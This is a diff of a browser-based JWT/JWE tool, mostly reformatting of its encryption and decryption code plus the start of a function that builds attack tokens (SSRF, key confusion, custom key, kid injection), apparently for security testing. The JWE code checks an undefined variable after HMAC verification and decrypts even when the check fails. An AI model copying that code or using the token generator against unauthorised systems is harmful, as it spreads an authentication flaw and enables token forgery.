+    if (areEqual(new Uint8Array(signature.slice(0, hmac_key.length)), base64urlToUint8Array(auth_tag))) {
         console.info("JWE is verified")
-        return true;}
-    else{
+        return true;
+    }
+    else {
         console.error(`JWE is NOT verified\nVerification Failed: HMAC ${alg}:`)
         return false;
     }
@@ -1818,101 +1815,101 @@ async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key,alg,auth_
  * @return {Promise<string|null>} - The decrypted plaintext as a string, or null if decryption fails.
  * @throws {Error} - Throws an error if the algorithm is not supported.
  */
-async function decrypt_ciphertext(ciphertext, cek ,iv, alg, additionalData,auth_tag){
+async function decrypt_ciphertext(ciphertext, cek, iv, alg, additionalData, auth_tag) {
     const enc = new TextEncoder()
     // -----------------------GCM-----------------------
-    if (alg.match(/^A\d{3}GCM$/)){ // unnecessary complicated for: A128GCM, A192GCM, A256GCM
+    if (alg.match(/^A\d{3}GCM$/)) { // unnecessary complicated for: A128GCM, A192GCM, A256GCM
         try {  // key import
             var key = await crypto.subtle.importKey(
                 "raw",
                 cek,
-                { 
+                {
                     name: "AES-GCM"
                 },
                 false,
                 ["decrypt"]
             );
         } catch (error) {
-            console.error("Key Import Failed:",error)
+            console.error("Key Import Failed:", error)
         }
         try { // decrypt ciphertext
             // AES-GCM: Ciphertext || auth_tag
             var decrypted = await crypto.subtle.decrypt(
-                { 
+                {
                     name: "AES-GCM",
                     additionalData: enc.encode(additionalData),
-                    iv: base64urlToUint8Array(iv), 
+                    iv: base64urlToUint8Array(iv),
                     tagLength: 128 // AES-GCM uses a 128-bit tag
                 },
-                key, 
-                new Uint8Array([...base64urlToUint8Array(ciphertext),...base64urlToUint8Array(auth_tag)])
+                key,
+                new Uint8Array([...base64urlToUint8Array(ciphertext), ...base64urlToUint8Array(auth_tag)])
             );
         } catch (error) {
-            console.error("Decryption Failed",error)
+            console.error("Decryption Failed", error)
             return
         }
     }
     //-----------------------CBC-----------------------
-    else if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512"){
+    else if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512") {
         // Decryption and Verification are seperate
         // cek = hmac_key || enc_key
-        // split cek 
+        // split cek
         const full_cek = new Uint8Array(cek)
-        console.debug("full_cek:",full_cek.length)
-        if (!([32,48,64].includes(full_cek.length))){
+        console.debug("full_cek:", full_cek.length)
+        if (!([32, 48, 64].includes(full_cek.length))) {
             throw new Error(`${alg}: bad full_keylength. Got: ${full_cek.length}`)
         }
-        const hmac_key = full_cek.slice(0,full_cek.length/2)
-        const enc_key = full_cek.slice(full_cek.length/2)
+        const hmac_key = full_cek.slice(0, full_cek.length / 2)
+        const enc_key = full_cek.slice(full_cek.length / 2)
         // verify the tag before decrypting the ciphertext
         // TODO would be usefull to do something when the token is not verified
-        const is_JWE_signature_valid = await verify_jwe_cbc(additionalData,iv,ciphertext,hmac_key,alg,auth_tag)
-        if (!is_JWE_verified_successfully){
+        const is_JWE_signature_valid = await verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key, alg, auth_tag)
+        if (!is_JWE_verified_successfully) {
             jwt_error_message("JWE signature verification failed - decryption continued but might fail")
         }
         try { // key import
             var key = await crypto.subtle.importKey(
                 "raw",
                 enc_key,
-                { 
+                {
                     name: "AES-CBC"
                 },
                 false,
                 ["decrypt"]
             );
         } catch (error) {
-            console.error("Key Import Failed:",error)
+            console.error("Key Import Failed:", error)
         }
         try { // decrypt ciphertext
             var decrypted = await crypto.subtle.decrypt(
-                { 
+                {
                     name: "AES-CBC",
                     iv: base64urlToUint8Array(iv)
                 },
-                key, 
+                key,
                 base64urlToUint8Array(ciphertext)
             );
         } catch (error) {
-            console.error("Decryption Failed",error)
+            console.error("Decryption Failed", error)
             return
         }
     }
-    else{
-        throw new Error(alg+"Encryption Algorithm not supported");
-        
+    else {
+        throw new Error(alg + "Encryption Algorithm not supported");
+
     }
-    return new TextDecoder().decode(decrypted);  
+    return new TextDecoder().decode(decrypted);
 
 }
 
-async function encrypt(){
+async function encrypt() {
     /**
      * ASCII(Encoded Protected Header || '.' ||
         BASE64URL(JWE AAD))
      * JWE Encryption
      * - BASE64URL(UTF8(JWE Protected Header))
      * - generate Content Encryption Key (CEK)
-     * - Encrypt CEK with pubKey 
+     * - Encrypt CEK with pubKey
      * - Base64Url(encrypted_CEK)
      * - Generate random JWE IV
      * - Base64URL(JWE_IV)
@@ -1932,21 +1929,21 @@ async function encrypt(){
     // TODO: should also work for invalid JSON
     document.getElementById("errorMessageKeyJWE").innerText = "";
 
-    try { 
+    try {
         var header = b64URLencode(JSON.stringify(JSON.parse(document.getElementById("decodedHeaderJWE").value)));
         document.getElementById("errorMessageHeaderJWE").innerText = "";
     }
-    catch (e){
+    catch (e) {
         console.error(e);
         document.getElementById("errorMessageHeaderJWE").innerText = e;
         document.getElementById("tokenJWE").value = "";
         var header = b64URLencode(document.getElementById("decodedHeaderJWE").value);
     }
-    try{
+    try {
         var body = b64URLencode(JSON.stringify(JSON.parse(document.getElementById("decodedBodyJWE").value)));
         document.getElementById("errorMessageBodyJWE").innerText = "";
     }
-    catch (e){
+    catch (e) {
         console.error(e);
         document.getElementById("errorMessageBodyJWE").innerText = e;
         document.getElementById("tokenJWE").value = "";
@@ -1956,81 +1953,79 @@ async function encrypt(){
     const encryption_algorithm = document.getElementById('encryptionAlgorithmJWE').value;
 
     // get cek or generate a new one if not set
-
-
     let cek = generateContentEncryptionKey(encryption_algorithm);
-    console.debug("cek_length:",cek.length);
+    console.debug("cek_length:", cek.length);
 
     // encrypt the cek
-    if (alg === "RSA-OAEP" || alg === "RSA-OAEP-256"){ 
-        var encrypted_cek = await encryptRSA_OAEP(cek,alg);
-        
+    if (alg === "RSA-OAEP" || alg === "RSA-OAEP-256") {
+        var encrypted_cek = await encryptRSA_OAEP(cek, alg);
+
     }
-    else if (alg === "dir"){
+    else if (alg === "dir") {
         const is_kek_base_64 = document.getElementById("isSymmetricKeyJWEBase64").checked;
-        if (!(document.getElementById("keyJWE").value)){
-            document.getElementById("keyJWE").value = generateContentEncryptionKey(encryption_algorithm,is_kek_base_64);
+        if (!(document.getElementById("keyJWE").value)) {
+            document.getElementById("keyJWE").value = generateContentEncryptionKey(encryption_algorithm, is_kek_base_64);
         }
         const kek_input_b64 = is_kek_base_64 ? document.getElementById("keyJWE").value : URL_to_base64(b64URLencode(document.getElementById("keyJWE").value))
         cek = kek_input_b64
         var encrypted_cek = "";
 
     }
-    else if (["A128KW","A192KW","A256KW","A128GCMKW","A192GCMKW","A256GCMKW","PBES2-HS256+A128KW","PBES2-HS384+A192KW","PBES2-HS512+A256KW"].includes(alg)){
+    else if (["A128KW", "A192KW", "A256KW", "A128GCMKW", "A192GCMKW", "A256GCMKW", "PBES2-HS256+A128KW", "PBES2-HS384+A192KW", "PBES2-HS512+A256KW"].includes(alg)) {
         // Symmetric Key Encryption
-        // So the following is only key stuff is only needed once 
+        // So the following is only key stuff is only needed once
         // Check if key is set, if not generate a new one
         const is_kek_base_64 = document.getElementById("isSymmetricKeyJWEBase64").checked;
-        if (!(document.getElementById("keyJWE").value)){
-            document.getElementById("keyJWE").value = generateKeyEncryptionKey(alg,is_kek_base_64);
-        } 
+        if (!(document.getElementById("keyJWE").value)) {
+            document.getElementById("keyJWE").value = generateKeyEncryptionKey(alg, is_kek_base_64);
+        }
         // If the key is not Base64 encoded, encode it
         const kek_input_b64 = is_kek_base_64 ? document.getElementById("keyJWE").value : URL_to_base64(b64URLencode(document.getElementById("keyJWE").value))
         // Check if key is set and has the right length
-        if (_jwe_algorithm_to_key_length[alg] !== base64ToUint8Array(kek_input_b64).length && !(alg.startsWith("PBES2"))){
+        if (_jwe_algorithm_to_key_length[alg] !== base64ToUint8Array(kek_input_b64).length && !(alg.startsWith("PBES2"))) {
             jwe_error_message(`Expected Key Length: ${_jwe_algorithm_to_key_length[alg]} bytes, got: ${base64ToUint8Array(kek_input_b64).length} bytes`);
             return false;
         }
-        if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW"){
+        if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW") {
             // Symmetric Key Encryption (AES-KW)
-            var encrypted_cek = await encryptAESKW(cek,encryption_algorithm,kek_input_b64);
+            var encrypted_cek = await encryptAESKW(cek, encryption_algorithm, kek_input_b64);
         }
-        else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW"){
+        else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW") {
             // Symmetric Key Encryption (AES-GCM)
-            const key_Wrapping_Object = await encryptAES_GCM_KW(cek,encryption_algorithm,kek_input_b64);
+            const key_Wrapping_Object = await encryptAES_GCM_KW(cek, encryption_algorithm, kek_input_b64);
             var encrypted_cek = key_Wrapping_Object.encrypted_cek;
             //let tmp_header = b64URLdecode(header);
             //header = b64URLencode(tmp_header.replace(/^(.)/,`$1"iv":"${tmp.iv}","tag":"${tmp.authentication_tag}",`))
             header = JSON.parse(b64URLdecode(header));
             header.iv = key_Wrapping_Object.iv
             header.tag = key_Wrapping_Object.authentication_tag;
-            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header,undefined,4);
+            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header, undefined, 4);
             header = b64URLencode(JSON.stringify(header));
         }
-        else if (alg === "PBES2-HS256+A128KW" || alg === "PBES2-HS384+A192KW" || alg === "PBES2-HS512+A256KW"){
+        else if (alg === "PBES2-HS256+A128KW" || alg === "PBES2-HS384+A192KW" || alg === "PBES2-HS512+A256KW") {
             // PBES2 Key Encryption
             const salt = document.getElementById("saltJWE").value;
-            console.debug("salt:",salt);
-            if (!salt){
+            console.debug("salt:", salt);
+            if (!salt) {
                 jwe_error_message("Salt is required for PBES2 Key Encryption");
                 return false;
             }
             const iterations = document.getElementById("pbkdf2IterationsJWE").value;
-            if (!iterations){
+            if (!iterations) {
                 jwe_error_message("PBKDF2 Iterations are required for PBES2 Key Encryption");
                 return false;
             }
-            var encrypted_cek = await encryptPBES2(cek,alg, encryption_algorithm, kek_input_b64, salt, iterations);
+            var encrypted_cek = await encryptPBES2(cek, alg, encryption_algorithm, kek_input_b64, salt, iterations);
             header = JSON.parse(b64URLdecode(header));
             header.p2s = base64_to_URL(salt);
             header.p2c = iterations;
-            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header,undefined,4);
+            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header, undefined, 4);
             header = b64URLencode(JSON.stringify(header));
 
-        }   
+        }
     }
 
-    console.debug("enc_cek:",encrypted_cek);
+    console.debug("enc_cek:", encrypted_cek);
 
     // generate IV
     let ivLength = 12; //  AES-GCM
@@ -2042,26 +2037,25 @@ async function encrypt(){
     //const iv = base64urlToUint8Array('AxY8DCtDaGlsbGljb3RoZQ')
 
     // encrypt the plaintext
-    const encrypted_data = await encryptPlaintextJWE(body,encryption_algorithm,cek,header,iv);
+    const encrypted_data = await encryptPlaintextJWE(body, encryption_algorithm, cek, header, iv);
 
     // Create the JWE token and set it in the input field
     document.getElementById("tokenJWE").value = header + "." + encrypted_cek + '.' + Uint8ArrayTobase64Url(iv) + '.' + encrypted_data["ciphertext"] + '.' + encrypted_data["authentication_tag"];
-    console.debug("body b64Url",body);
-    console.debug("body array",base64urlToUint8Array(body));
-    console.debug("iv (b64):",URL_to_base64(Uint8ArrayTobase64Url(iv)));
-    console.debug("aad (b64):",URL_to_base64(header));
-    console.debug("auth_tag (b64):",URL_to_base64(encrypted_data["authentication_tag"]));
-    console.debug("ct (b64):",URL_to_base64(encrypted_data["ciphertext"]));
-    console.debug("cek (hex):",cek);
-    
-    
+    console.debug("body b64Url", body);
+    console.debug("body array", base64urlToUint8Array(body));
+    console.debug("iv (b64):", URL_to_base64(Uint8ArrayTobase64Url(iv)));
+    console.debug("aad (b64):", URL_to_base64(header));
+    console.debug("auth_tag (b64):", URL_to_base64(encrypted_data["authentication_tag"]));
+    console.debug("ct (b64):", URL_to_base64(encrypted_data["ciphertext"]));
+    console.debug("cek (hex):", cek);
 }
+
 /**
- * 
+ *
  * Encrypts the CEK (Content Encryption Key) using AES Key Wrap (AES-GCM-KW).
  * This function is used to wrap the CEK with a Key Encryption Key (KEK).
  * It takes the CEK, algorithm, and KEK as inputs and returns the encrypted CEK.
- * 
+ *
  *
  * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
  * @param {string} alg - The algorithm used for Content Encryption (e.g A128GCM, A256CBC-HS512).
@@ -2072,7 +2066,7 @@ async function encrypt(){
 async function encryptAES_GCM_KW(cek, alg, kek) {
     const importedKek = await crypto.subtle.importKey(
         "raw",
-        base64urlToUint8Array(base64_to_URL(kek)), 
+        base64urlToUint8Array(base64_to_URL(kek)),
         { name: "AES-GCM" },
         true,
         ["wrapKey"]
@@ -2095,7 +2089,7 @@ async function encryptAES_GCM_KW(cek, alg, kek) {
             "raw",
             importedCek,
             importedKek,
-            { 
+            {
                 name: "AES-GCM",
                 iv: iv, // AES-GCM uses a 12 byte IV
                 tagLength: 128 // AES-GCM uses a 128-bit tag
@@ -2108,8 +2102,6 @@ async function encryptAES_GCM_KW(cek, alg, kek) {
             iv: Uint8ArrayTobase64Url(iv),
             authentication_tag: Uint8ArrayTobase64Url(authentication_tag)
         }
-            
-    
     }
     else { // GCM 128, 192, 256
         const importedCek = await crypto.subtle.importKey(
@@ -2126,7 +2118,7 @@ async function encryptAES_GCM_KW(cek, alg, kek) {
             "raw",
             importedCek,
             importedKek,
-            { 
+            {
                 name: "AES-GCM",
                 iv: iv, // AES-GCM uses a 12 byte IV
                 tagLength: 128 // AES-GCM uses a 128-bit tag
@@ -2143,7 +2135,6 @@ async function encryptAES_GCM_KW(cek, alg, kek) {
 
 }
 
-
 /**
  * Encrypts the CEK (Content Encryption Key) using PBES2 (Password-Based Encryption Scheme 2).
  * This function is used to derive a key from a password and then encrypt the CEK with that derived key.
@@ -2157,7 +2148,7 @@ async function encryptAES_GCM_KW(cek, alg, kek) {
  * @param {Number} iterations - The number of iterations for the key derivation function (PBKDF2).
  * @return {Promise<string>} - Base64URL: The encrypted CEK wrapped with the KEK.
  */
-async function encryptPBES2(cek, alg,encryption_alg, password, salt, iterations) {
+async function encryptPBES2(cek, alg, encryption_alg, password, salt, iterations) {
     const passwordBuffer = await crypto.subtle.importKey(
         "raw",
         base64ToUint8Array(password),
@@ -2184,7 +2175,7 @@ async function encryptPBES2(cek, alg,encryption_alg, password, salt, iterations)
     if (encryption_alg === "A128CBC-HS256" || encryption_alg === "A192CBC-HS384" || encryption_alg === "A256CBC-HS512") {
         // Since CBC CEK is double length (HMAC + AES-CBC), we need to import it as HMAC key
         const rawCekBuffer = base64ToUint8Array(cek);
-        assert(((encryption_alg.slice(1,4)/4 === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}\n Expected: ${encryption_alg.slice(1,4)/4} bytes`);
+        assert(((encryption_alg.slice(1, 4) / 4 === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}\n Expected: ${encryption_alg.slice(1, 4) / 4} bytes`);
         const importedCek = await crypto.subtle.importKey(
             "raw",
             rawCekBuffer,
@@ -2226,11 +2217,11 @@ async function encryptPBES2(cek, alg,encryption_alg, password, salt, iterations)
 }
 
 /**
- * 
+ *
  * Encrypts the CEK (Content Encryption Key) using AES Key Wrap (AES-KW).
  * This function is used to wrap the CEK with a Key Encryption Key (KEK).
  * It takes the CEK, algorithm, and KEK as inputs and returns the encrypted CEK.
- * 
+ *
  *
  * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
  * @param {string} alg - The algorithm used for Content Encryption (e.g A128GCM, A256CBC-HS512).
@@ -2238,8 +2229,8 @@ async function encryptPBES2(cek, alg,encryption_alg, password, salt, iterations)
  * @return {Promise<string>} - Base64URL: The encrypted CEK wrapped with the KEK.
  * @throws {Error} - Throws an error if the encryption fails.
  */
-async function encryptAESKW(cek,alg,kek){
-    console.debug("encryptAESKW: alg ",alg,_alg_converter[alg]);
+async function encryptAESKW(cek, alg, kek) {
+    console.debug("encryptAESKW: alg ", alg, _alg_converter[alg]);
     const importedKek = await crypto.subtle.importKey(
         "raw",
         base64ToUint8Array(kek),
@@ -2247,12 +2238,12 @@ async function encryptAESKW(cek,alg,kek){
             name: "AES-KW"
         },
         true,
-        ["wrapKey"]     
+        ["wrapKey"]
     );
-    if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512"){
+    if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512") {
         // Since CBC CEK is double length (HMAC + AES-CBC), we need to import it as HMAC key
         const rawCekBuffer = base64urlToUint8Array(base64_to_URL(cek))
-        assert((((alg.slice(1,4)/4) === rawCekBuffer.length)),`${alg}: bad full_keylength. Got: ${rawCekBuffer.length}`)
+        assert((((alg.slice(1, 4) / 4) === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}`)
         const importedCek = await crypto.subtle.importKey(
             "raw",
             rawCekBuffer,
@@ -2273,7 +2264,7 @@ async function encryptAESKW(cek,alg,kek){
         );
         return Uint8ArrayTobase64Url(encrypted_cek);
     }
-    else{ // GCM 128, 192, 256
+    else { // GCM 128, 192, 256
         const importedCek = await crypto.subtle.importKey(
             "raw",
             base64urlToUint8Array(base64_to_URL(cek)),
@@ -2299,7 +2290,7 @@ async function encryptAESKW(cek,alg,kek){
 /**
  * Encrypts the plaintext for JWE (JSON Web Encryption) using the specified algorithm and CEK (Content Encryption Key).
  * This function handles the encryption of the plaintext using AES-GCM or AES-CBC-HMAC based on the provided algorithm.
- * 
+ *
  * @param {string} plaintext - Base64Url: The plaintext to be encrypted.
  * @param {string} encryption_alg: The encryption algorithm to use (e.g., A128GCM, A256CBC-HS512).
  * @param {string} raw_cek - Base64: The raw Content Encryption Key (CEK) used for encryption.
@@ -2307,54 +2298,54 @@ async function encryptAESKW(cek,alg,kek){
  * @param {Uint8Array} iv -  The initialization vector (IV) used for encryption.
  * @return {Promise<{ciphertext: string, authentication_tag: string}>} - Returns an object containing the ciphertext and authentication tag, both in Base64Url format.
  */
-async function encryptPlaintextJWE(plaintext,encryption_alg,raw_cek,aad,iv){
-    console.log(_alg_converter[encryption_alg],encryption_alg);
+async function encryptPlaintextJWE(plaintext, encryption_alg, raw_cek, aad, iv) {
+    console.log(_alg_converter[encryption_alg], encryption_alg);
     const enc = new TextEncoder();
 
-    console.debug("aad:",aad);
-    console.debug("iv:",iv);
+    console.debug("aad:", aad);
+    console.debug("iv:", iv);
     // Encrypt AES128GCM
-    if (["A128GCM", "A192GCM", "A256GCM"].includes(encryption_alg)){
-        if (iv.length !== 12){
+    if (["A128GCM", "A192GCM", "A256GCM"].includes(encryption_alg)) {
+        if (iv.length !== 12) {
             throw new Error("AES-GCM requires a 12 byte IV, got: " + iv.length);
         }
-    const cek = await crypto.subtle.importKey(
-        "raw",
-        base64ToUint8Array(raw_cek),
-        {
-            name: "AES-GCM",
-            length: parseInt(encryption_alg.slice(1, 4)) // A128GCM -> 128
-        },
-        true,
-        ["encrypt","decrypt"]
-    );
-    var encryptedData = new Uint8Array(await crypto.subtle.encrypt(
-        {
-            name: "AES-GCM",
-            iv: iv,
-            additionalData: enc.encode(aad),
-            tagLength: 128 // AES-GCM uses a 128-bit tag
-        },
-        cek,
-        base64urlToUint8Array(plaintext)
-    ));
-    console.log(encryptedData);
-    return {
-        ciphertext: Uint8ArrayTobase64Url(encryptedData.slice(0,encryptedData.length - 16)), 
-        authentication_tag: Uint8ArrayTobase64Url(encryptedData.slice(encryptedData.length - 16))
-    };
+        const cek = await crypto.subtle.importKey(
+            "raw",
+            base64ToUint8Array(raw_cek),
+            {
+                name: "AES-GCM",
+                length: parseInt(encryption_alg.slice(1, 4)) // A128GCM -> 128
+            },
+            true,
+            ["encrypt", "decrypt"]
+        );
+        var encryptedData = new Uint8Array(await crypto.subtle.encrypt(
+            {
+                name: "AES-GCM",
+                iv: iv,
+                additionalData: enc.encode(aad),
+                tagLength: 128 // AES-GCM uses a 128-bit tag
+            },
+            cek,
+            base64urlToUint8Array(plaintext)
+        ));
+        console.log(encryptedData);
+        return {
+            ciphertext: Uint8ArrayTobase64Url(encryptedData.slice(0, encryptedData.length - 16)),
+            authentication_tag: Uint8ArrayTobase64Url(encryptedData.slice(encryptedData.length - 16))
+        };
 
     }
     // Encrypt AES128CBC-HS256, AES192CBC-HS384, AES256CBC-HS512
-    else if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)){
-        assert(iv.length === 16,`AES-CBC requires a 16 byte IV, got: ${iv.length}`);
+    else if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
+        assert(iv.length === 16, `AES-CBC requires a 16 byte IV, got: ${iv.length}`);
 
         // For AES-CBC-HMAC, split the key - first half is for HMAC, second half for AES-CBC
         const full_key_buffer = base64ToUint8Array(raw_cek);
         const hmac_key_buffer = full_key_buffer.slice(0, full_key_buffer.length / 2);
         const enc_key_buffer = full_key_buffer.slice(full_key_buffer.length / 2);
         assert(full_key_buffer.length === encryption_alg.slice(1, 4) / 4,
-                `AES-CBC requires a ${encryption_alg.slice(1, 4) / 4} byte CEK, got: ${full_key_buffer.length}`);
+            `AES-CBC requires a ${encryption_alg.slice(1, 4) / 4} byte CEK, got: ${full_key_buffer.length}`);
 
         console.debug("hmac_key_buffer", hmac_key_buffer);
         console.debug("enc_key_buffer", enc_key_buffer);
@@ -2368,7 +2359,7 @@ async function encryptPlaintextJWE(plaintext,encryption_alg,raw_cek,aad,iv){
                 name: "AES-CBC"
             },
             true,
-            ["encrypt","decrypt"]
+            ["encrypt", "decrypt"]
         );
 
         // AES-CBC-HMAC: Encrypt the plaintext
@@ -2381,7 +2372,7 @@ async function encryptPlaintextJWE(plaintext,encryption_alg,raw_cek,aad,iv){
             base64urlToUint8Array(plaintext)
         );
 
-        // AES-CBC-HMAC: Import the HMAC key 
+        // AES-CBC-HMAC: Import the HMAC key
         const hmacKey = await crypto.subtle.importKey(
             "raw",
             hmac_key_buffer,
@@ -2398,9 +2389,9 @@ async function encryptPlaintextJWE(plaintext,encryption_alg,raw_cek,aad,iv){
         const al = getAL(aadBuffer);
         const ciphertextBuffer = new Uint8Array(ciphertext);
         const toBeSigned = new Uint8Array([...aadBuffer, ...iv, ...ciphertextBuffer, ...al])
-        console.debug("toBeSigned (Buffer):",toBeSigned);
-        console.debug("toBeSigned b64Url:",Uint8ArrayTobase64Url(toBeSigned));
-        
+        console.debug("toBeSigned (Buffer):", toBeSigned);
+        console.debug("toBeSigned b64Url:", Uint8ArrayTobase64Url(toBeSigned));
+
         // AES-CBC-HMAC: Sign the data to create the authentication tag
         const signature = new Uint8Array(await crypto.subtle.sign(
             'HMAC',
@@ -2409,37 +2400,32 @@ async function encryptPlaintextJWE(plaintext,encryption_alg,raw_cek,aad,iv){
         ));
         return {
             ciphertext: Uint8ArrayTobase64Url(ciphertextBuffer),
-            authentication_tag: Uint8ArrayTobase64Url(signature.slice(0,encryption_alg.split("CBC-HS")[1]/16)) // HMAC tag is 16 bytes
+            authentication_tag: Uint8ArrayTobase64Url(signature.slice(0, encryption_alg.split("CBC-HS")[1] / 16)) // HMAC tag is 16 bytes
         };
     }
-        
-
-
-    
 }
-
 
 /**
  * Encrypts the Content Encryption Key (CEK) using RSA-OAEP(-256).
  * This function is used to encrypt the CEK with a public key in publicKeyJWE.
  * It checks if the public key is provided, generates a new RSA key pair if not, and then encrypts the CEK using the RSA-OAEP algorithm.
- * 
+ *
  *
  * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
  * @param {string} alg - The algorithm used for encryption (RSA-OAEP, RSA-OAEP-256).
  * @return {Promise<string>} - Base64URL: The encrypted CEK.
  */
-async function encryptRSA_OAEP(cek,alg){
-    console.debug("encryptRSA_OAEP: alg ",alg,_alg_converter[alg]);
-    if (!(document.getElementById("privateKeyJWE").value)){
+async function encryptRSA_OAEP(cek, alg) {
+    console.debug("encryptRSA_OAEP: alg ", alg, _alg_converter[alg]);
+    if (!(document.getElementById("privateKeyJWE").value)) {
         const keypair = await generateRSA_OAEP(alg);
         document.getElementById('privateKeyJWE').value = keypair[0];
         document.getElementById('publicKeyJWE').value = keypair[1];
     }
-    try{
+    try {
         const publicKey = await crypto.subtle.importKey(
             document.getElementById('publicKeyJWE').value.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
-            decodeKey(document.getElementById('publicKeyJWE').value,isPublicKey=true),
+            decodeKey(document.getElementById('publicKeyJWE').value, isPublicKey = true),
             {
                 name: "RSA-OAEP",
                 hash: _alg_converter[alg] // RSA-OAEP or RSA-OAEP-256 -> SHA-1 or SHA-256
@@ -2459,7 +2445,7 @@ async function encryptRSA_OAEP(cek,alg){
         return Uint8ArrayTobase64Url(encrypted);
 
     }
-    catch(e){
+    catch (e) {
         document.getElementById("errorMessagePublicKeyJWE").innerText = "Public Key: " + e;
     }
     return "";
@@ -2470,15 +2456,15 @@ async function encryptRSA_OAEP(cek,alg){
 // #region ====================== Attack Functions
 
 /**
- * Generates vulnerable tokens based on the selected vulnerabilities from the checkboxes. 
+ * Generates vulnerable tokens based on the selected vulnerabilities from the checkboxes.
  * It creates a textfile with the generated tokens and triggers a download.
  * This function is called when the user clicks the "Generate Vulnerable Tokens" button.
  * It retrieves the JWT token from the input field (jwt-attacks-input), validates it, and then iterates through the selected vulnerabilities to generate tokens.
  * It uses the attack functions to generate the tokens and collects them in an array.
  * @return {Promise<array.TestCase|[]>} array of the generated test cases or an empty array if no tokens were generated or an error occurred
- * 
+ *
  */
-async function generateVulnerableTokens(){
+async function generateVulnerableTokens() {
     const jwt = document.getElementById("jwt-attacks-input").value;
     document.getElementById("jwt-attacks-error-message").innerText = ""; // reset the error message
     const spans = document.querySelectorAll('span.vulnerability-with-error-message');
@@ -2504,7 +2490,7 @@ async function generateVulnerableTokens(){
     // make input fields mandatory - SSRF, KeyConfusion
     // Check if required input fields are filled for specific vulnerabilities
     for (const vulnKey of selectedVulnerabilities) {
-        switch(vulnKey) {
+        switch (vulnKey) {
             case 'SSRF':
                 if (!document.getElementById("SSRFURL").value) {
                     jwt_attacks_error_message("Please enter a URL for SSRF attack");
@@ -2520,10 +2506,10 @@ async function generateVulnerableTokens(){
                 }
                 break;
             case 'CustomKey':
-                if(document.getElementById("testCustomKeyViaURL").checked && !document.getElementById("CustomKeyURL").value){
-                    
+                if (document.getElementById("testCustomKeyViaURL").checked && !document.getElementById("CustomKeyURL").value) {
+
                     jwt_attacks_error_message("Please enter a URL for Custom Key attack");
-                    document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');      
+                    document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                     return [];
                 }
             case 'Kid':
@@ -2554,14 +2540,14 @@ async function generateVulnerableTokens(){
                 break
             case 'CustomKey':
                 let algsToBeTested = [document.getElementById("customKeyAlg").value];
-                if (document.getElementById("testAllCustomKeyAlgs").checked){
+                if (document.getElementById("testAllCustomKeyAlgs").checked) {
                     // If the user wants to test all algorithms with the custom key
                     // algsToBeTested = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];
-                    algsToBeTested = ['HS256','RS256','ES256','PS256'] // this should be enough, right?
+                    algsToBeTested = ['HS256', 'RS256', 'ES256', 'PS256'] // this should be enough, right?
                 }
-                let testCustomKeyViaURL = document.getElementById("testCustomKeyViaURL").checked; 
-                for (const alg of algsToBeTested){
-                    results.push(...await attackCustomKey(jwt, alg, document.getElementById("CustomKey").value,testCustomKeyViaURL,  document.getElementById("CustomKeyURL").value,true))
+                let testCustomKeyViaURL = document.getElementById("testCustomKeyViaURL").checked;
+                for (const alg of algsToBeTested) {
+                    results.push(...await attackCustomKey(jwt, alg, document.getElementById("CustomKey").value, testCustomKeyViaURL, document.getElementById("CustomKeyURL").value, true))
                     testCustomKeyViaURL = false;
                 }
                 break
@@ -2570,7 +2556,7 @@ async function generateVulnerableTokens(){
                 // But since were are assuming that the server does something weird while validating
                 // we can also assume that it may only work with on of the algorithms
                 // And since they are automatically generated, we can just try our luck
-                for (const alg of ["HS256", "HS384", "HS512"]){
+                for (const alg of ["HS256", "HS384", "HS512"]) {
                     results.push(...await attackKeyConfusion(jwt, alg, document.getElementById("KeyConfusionKey").value, true))
                 }
                 break
@@ -2583,9 +2569,9 @@ async function generateVulnerableTokens(){
                 break
             case 'Kid':
                 const useCustomKidPayloads = document.getElementById("useKidCustomPayloadList").checked;
-                if (useCustomKidPayloads){
+                if (useCustomKidPayloads) {
                     const customKidPayloadList = parsePayloadContentForKid(document.getElementById("kidCustomPayloadList").value);
-                    if (customKidPayloadList.length === 0){
+                    if (customKidPayloadList.length === 0) {
                         jwt_attacks_error_message("Custom Kid Payload List is empty or invalid");
                         break;
                     }
@@ -2596,7 +2582,7 @@ async function generateVulnerableTokens(){
                 }
 
                 break
-            }
+        }
 
     }
 
@@ -2605,10 +2591,10 @@ async function generateVulnerableTokens(){
     results = results.filter(item => !Array.isArray(item) || item.length > 0);
 
     // filter out the testToken from the results
-    for (const result of results){
+    for (const result of results) {
         if (result) only_token_results.push(result.testToken)
     }
-    if (only_token_results.length === 0){
+    if (only_token_results.length === 0) {
         return [];
     }
 
@@ -2626,24 +2612,22 @@ async function generateVulnerableTokens(){
     return results;
 }
 
-
-async function attackKid(token,useDefaultPayloadList = true,  useCustomPayloadlist = false, customPayloadList = []){
